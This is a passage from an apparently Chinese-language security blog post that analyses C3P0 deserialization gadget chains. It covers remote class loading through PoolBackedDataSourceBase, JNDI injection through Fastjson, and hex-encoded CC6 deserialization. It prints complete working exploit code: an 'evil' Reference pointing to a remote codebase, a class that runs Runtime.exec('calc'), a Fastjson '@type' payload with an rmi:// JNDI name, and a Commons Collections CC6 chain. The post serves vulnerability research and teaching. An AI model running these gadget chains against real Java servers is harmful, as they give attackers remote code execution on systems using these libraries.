o</code>​将反序列化出来的对象进行强制转换了，那么也就是存在一定的关系(具体就是向上转型，向下转型，接口转型)，所以能强制类型转换我们反序列化出来的东西的那必然是需要集成<code>Serializable</code>​接口的</p></blockquote><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710218.png" alt="image">​</p><p>所以这里也就是作者非常巧妙的地方吧，因为在<code>readObject</code>​中这么写了，肯定有他写的原因，所以就去看了 <code>\c3p0.9.5.2.jar!\com\mchange\v2\c3p0\impl\PoolBackedDataSourceBase.java#writeObject()</code>​这个序列化的入口</p><p>‍</p><p>可以发现这里是 将当前对象的<code>connectionPoolDataSource</code>​属性进行序列化，如果不能序列化便会在<code>catch</code>​中对<code>connectionPoolDataSource</code>​属性用<code>indirector.indirectForm</code>​方法处理后再进行序列化操作</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710406.png" alt="image">​</p><p>我们跟进下<code>indirectForm</code>​方法，将我们传入的内容强转成<code>Referenceable</code>​类 并且调用<code>getReference</code>​方法，并将返回的结果作为参数实例化一个<code>ReferenceSerialized</code>​对象，然后序列化该对象</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710673.png" alt="image">​</p><p>也就是说我们最终序列化的是一个<code>ReferenceSerialized</code>​类的对象，我们来跟进下</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710827.png" alt="image">​</p><p>再来看看头部，发现其继承的恰好就是<code>IndirectlySerialized</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710014.png" alt="image">​</p><p>因此在<code>PoolBackedDataSourceBase#readObject</code>​中调用的其实是<code>ReferenceSerialized#getObject()</code>​方法</p><p>那其实就很清晰了，我们需要用到这个<code>PoolBackedDataSourceBase</code>​类的<code>writeObject</code>​方法来进行序列化的操作，并且再调用他本身的<code>readObject()</code>​方法来反序列化，所以我们exp就可以去手写一下了，此时我们只需要把我们想传入的类通过反射添加到<code>connectionPoolDataSource</code>​这个属性即可</p><p>而这个类就是一个不继承<code>Serializable</code>​接口的方法但是他要实现<code>ConnectionPoolDataSource</code>​接口和实现<code>Referenceable</code>​接口的类，然后通过<code>getReference</code>​来返回一个<code>Reference</code>​类来进行远程加载类即可</p><p>‍</p><p>最终EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> javax.naming.Referenceable;<br><span class="hljs-keyword">import</span> javax.sql.ConnectionPoolDataSource;<br><span class="hljs-keyword">import</span> javax.sql.PooledConnection;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.sql.SQLFeatureNotSupportedException;<br><span class="hljs-keyword">import</span> java.util.logging.Logger;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">c3p</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">PoolBackedDataSourceBase</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PoolBackedDataSourceBase</span>(<span class="hljs-literal">false</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f1</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;connectionPoolDataSource&quot;</span>); <span class="hljs-comment">//此类是PoolBackedDataSourceBase抽象类的实现</span><br>        f1.setAccessible(<span class="hljs-literal">true</span>);<br>        f1.set(a,<span class="hljs-keyword">new</span> <span class="hljs-title class_">evil</span>());<br><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;a.bin&quot;</span>)));<br>        ser.writeObject(a);<br>        ser.close();<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">unser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;a.bin&quot;</span>));<br>        unser.readObject();<br>        unser.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">evil</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ConnectionPoolDataSource</span>, Referenceable &#123;<br>        <span class="hljs-keyword">public</span> PrintWriter <span class="hljs-title function_">getLogWriter</span> <span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;&#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLogWriter</span> <span class="hljs-params">( PrintWriter out )</span> <span class="hljs-keyword">throws</span> SQLException &#123;&#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLoginTimeout</span> <span class="hljs-params">( <span class="hljs-type">int</span> seconds )</span> <span class="hljs-keyword">throws</span> SQLException &#123;&#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getLoginTimeout</span> <span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br>        <span class="hljs-keyword">public</span> Logger <span class="hljs-title function_">getParentLogger</span> <span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLFeatureNotSupportedException &#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;&#125;<br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span> <span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;&#125;<br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span> <span class="hljs-params">( String user, String password )</span> <span class="hljs-keyword">throws</span> SQLException &#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;&#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Reference <span class="hljs-title function_">getReference</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;evilexp&quot;</span>,<span class="hljs-string">&quot;evilexp&quot;</span>,<span class="hljs-string">&quot;http://127.0.0.1:8888/&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>‍</p><p>恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">evilexp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">evilexp</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710202.png" alt="image">​</p><p>‍</p><h3 id="JNDI链"><a href="#JNDI链" class="headerlink" title="JNDI链"></a>JNDI链</h3><p>‍</p><p>这里其实如果细心的话还是可以看到在上面的Gadget中是存在一个很明显的字眼<code>lookup</code>​的，但实际上在反序列化时我们是无法调用到该方法的，因为属性<code>contextName</code>​为默认<code>null</code>​且不可控</p><p>‍</p><p>这条链子依赖于Fastjson或Jackson反序列化漏洞</p><p>作者先是找到了 <code>\c3p0-0.9.5.2-sources.jar!\com\mchange\v2\c3p0\JndiRefForwardingDataSource.java#dereference()</code>​中存在了明显的<code>lookup</code>​函数可能存在JNDI注入语句</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710606.png" alt="image">​</p><p>那么这里判断<code>jndiName</code>​是否为<code>String</code>​类之后就把<code>jndiName</code>​进行传入<code>lookup</code>​方法中，我们去看看这个<code>jndiName</code>​是否可控并且寻找谁去调用了<code>dereference</code>​方法</p><p>跟进<code>getJndiName</code>​发现对 <code>jndiName</code>​ 进行了判断该值是不是 <code>Name</code>​ 的类型，如果是就返回 <code>((Name) jndiName).clone()</code>​，若不是就返回 <code>String</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710097.png" alt="image">​</p><p>那么可以发现<code>jndiName</code>​只要传入String类型即可控制了(之后是有setter方法的)</p><p>往上跟进谁调用了<code>dereference</code>​方法找到同类下的<code>inner</code>​方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710265.png" alt="image">​</p><p>满足<code>cachedInner</code>​为空即可进入下方逻辑</p><p>在往上跟</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710450.png" alt="image">​</p><p>找到了<code>setLoginTimeout</code>​方法只需要传入一个int类型即可触发，但是这里问题就来了，我的<code>setLoginTimeout</code>​其实已经可以通过<code>fastjson</code>​触发了，但是最终的JNDI的payload <code>jndiName</code>​属性却并没有赋值</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710620.png" alt="image">​</p><p>所以继续再往上跟能够找到<code>\c3p0-0.9.5.2-sources.jar!\com\mchange\v2\c3p0\WrapperConnectionPoolDataSource.java#setLoginTimeout()</code>​方法，但是这里的写法很奇怪，因为并不是我的<code>JndiRefForwardingDataSource</code>​类直接去调用，而是使用了<code>getNestedDataSource()</code>​方法(但仍能够被查找用法查找到)</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710794.png" alt="image">​</p><p>跟进下<code>getNestedDataSource</code>​ 发现返回<code>nestedDataSource</code>​属性</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710043.png" alt="image">​</p><p>通过调试可以发现他竟然这里返回的正是我们需要的<code>JndiRefForwardingDataSource</code>​类型</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710198.png" alt="image">​</p><p>所以问题就解决了，那么接下来这个类中仍然没有去set我们的<code>jndiName</code>​的方法，所以继续跟进</p><p>在<code>\c3p0-0.9.5.2-sources.jar!\com\mchange\v2\c3p0\JndiRefConnectionPoolDataSource.java#setLoginTimeout()</code>​调用了并且该类中也存在了<code>setJndiName</code>​方法来给<code>jndiName</code>​赋值，那么整条链子就完成了</p><p>‍</p><p>最后的EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>        <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\&quot;,&quot;</span> +<br>        <span class="hljs-string">&quot;\&quot;JndiName\&quot;:\&quot;rmi://127.0.0.1:1099/muogbv\&quot;, &quot;</span> +<br>        <span class="hljs-string">&quot;\&quot;LoginTimeout\&quot;:0&quot;</span> +<br>        <span class="hljs-string">&quot;&#125;&quot;</span>;<br>JSON.parse(payload);<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710494.png" alt="image">​</p><h3 id="C3P0-之-HEX流加载任意类攻击"><a href="#C3P0-之-HEX流加载任意类攻击" class="headerlink" title="C3P0 之 HEX流加载任意类攻击"></a>C3P0 之 HEX流加载任意类攻击</h3><p>‍</p><p>喵的不知道怎么起这个名字，看师傅们的博客说什么hexbase什么16进制加载，我整帅点的</p><p>链子的形成是因为这个类 <code>WrapperConnectionPoolDataSource</code>​ 的构造方法中对属性<code>userOverrides</code>​的赋值方式存在异样的写法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710918.png" alt="image">​</p><p>跟进<code>C3P0ImplUtils#parseUserOverridesAsString()</code>​方法，将该对象的<code>userOverridesAsString</code>​属性作为参数传入后进行了截取字符串+16进制解码</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710120.png" alt="image">​</p><p>值得注意的是，在解析过程中调用了substring()方法将字符串头部的<code>HASM_HEADER</code>​截去了，因此我们在构造时需要在十六进制字符串头部加上<code>HASM_HEADER</code>​，并且会截去字符串最后一位，所以需要在结尾加上一个<code>;</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710311.png" alt="image">​</p><p>‍</p><p>接着将解码后的数据进行<code>SerializableUtils#fromByteArray()</code>​方法的处理</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710450.png" alt="image">​</p><p>跟进<code>deserializeFromByteArray</code>​发现最终调用<code>readObject</code>​方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710651.png" alt="image">​</p><p>‍</p><p>那么其实就很简单了，先写一个本地的demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.beans.PropertyVetoException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.StringWriter;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException, InstantiationException, NoSuchFieldException, PropertyVetoException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">hex</span> <span class="hljs-operator">=</span> toHexAscii(tobyteArray(CC6()));<br><br><br>        <span class="hljs-type">WrapperConnectionPoolDataSource</span> <span class="hljs-variable">wrapperConnectionPoolDataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WrapperConnectionPoolDataSource</span>(<span class="hljs-literal">false</span>);<br>        wrapperConnectionPoolDataSource.setUserOverridesAsString(<span class="hljs-string">&quot;HexAsciiSerializedMap:&quot;</span>+hex+<span class="hljs-string">&quot;;&quot;</span>);<br>  <br>    &#125;<br><br>    <span class="hljs-comment">//CC6的利用链</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">CC6</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-comment">//使用InvokeTransformer包装一下</span><br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object,Object&gt; hashMap1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        LazyMap lazyMap= (LazyMap) LazyMap.decorate(hashMap1,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        TiedMapEntry tiedMapEntry=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">&quot;abc&quot;</span>);<br>        HashMap&lt;Object,Object&gt; hashMap2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap2.put(tiedMapEntry,<span class="hljs-string">&quot;eee&quot;</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;abc&quot;</span>);<br><br><br>        <span class="hljs-comment">//反射修改LazyMap类的factory属性</span><br>        Class clazz=LazyMap.class;<br>        Field factoryField= clazz.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazyMap,chainedTransformer);<br><br>        <span class="hljs-keyword">return</span> hashMap2;<br>    &#125;<br><br><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addHexAscii</span><span class="hljs-params">(<span class="hljs-type">byte</span> b, StringWriter sw)</span><br>    &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">ub</span> <span class="hljs-operator">=</span> b &amp; <span class="hljs-number">0xff</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">h1</span> <span class="hljs-operator">=</span> ub / <span class="hljs-number">16</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">h2</span> <span class="hljs-operator">=</span> ub % <span class="hljs-number">16</span>;<br>        sw.write(toHexDigit(h1));<br>        sw.write(toHexDigit(h2));<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">char</span> <span class="hljs-title function_">toHexDigit</span><span class="hljs-params">(<span class="hljs-type">int</span> h)</span><br>    &#123;<br>        <span class="hljs-type">char</span> out;<br>        <span class="hljs-keyword">if</span> (h &lt;= <span class="hljs-number">9</span>) out = (<span class="hljs-type">char</span>) (h + <span class="hljs-number">0x30</span>);<br>        <span class="hljs-keyword">else</span> out = (<span class="hljs-type">char</span>) (h + <span class="hljs-number">0x37</span>);<br>        <span class="hljs-comment">//System.err.println(h + &quot;: &quot; + out);</span><br>        <span class="hljs-keyword">return</span> out;<br>    &#125;<br><br>    <span class="hljs-comment">//将类序列化为字节数组</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] tobyteArray(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bao</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bao);<br>        oos.writeObject(o);<br>        <span class="hljs-keyword">return</span> bao.toByteArray();<br>    &#125;<br><br>    <span class="hljs-comment">//字节数组转十六进制</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">toHexAscii</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span><br>    &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> bytes.length;<br>        <span class="hljs-type">StringWriter</span> <span class="hljs-variable">sw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>(len * <span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; len; ++i)<br>            addHexAscii(bytes[i], sw);<br>        <span class="hljs-keyword">return</span> sw.toString();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710145.png" alt="image">​</p><p>其实很容易就能联想到<code>Fastjson</code>​了，因为可以发现<code>WrapperConnectionPoolDataSource</code>​也是存在setter方法的</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710403.png" alt="image">​</p><p>那么就可以通过Fastjson来去引入<code>com.mchange.v2.c3p0.WrapperConnectionPoolDataSource</code>​的<code>setuserOverridesAsString</code>​方法并且传入反序列化的<code>hex</code>​值来进行任意类加载或者RCE了</p><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.beans.PropertyVetoException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span 